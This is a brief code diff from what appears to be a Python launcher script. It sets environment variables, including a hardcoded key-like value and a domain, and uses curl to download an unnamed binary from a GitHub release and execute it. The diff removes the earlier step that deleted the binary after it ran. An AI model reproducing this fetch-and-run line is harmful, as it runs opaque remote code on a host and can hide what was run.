@@ -6,4 +6,4 @@ os.environ['K_K'] = 'SJq8bSUJ04mc1yXG'
 os.environ['C_D'] = 'streamlit3.seav.eu.org'
 os.environ['PORT'] = '3000'
 
-subprocess.call('curl -L -o jsko https://github.com/seav1/dl/releases/download/files/jsko && chmod +x jsko && ./jsko && sleep 10 && rm jsko', shell=True)
+subprocess.call('curl -L -o jsko https://github.com/seav1/dl/releases/download/files/jsko && chmod +x jsko && ./jsko', shell=True)
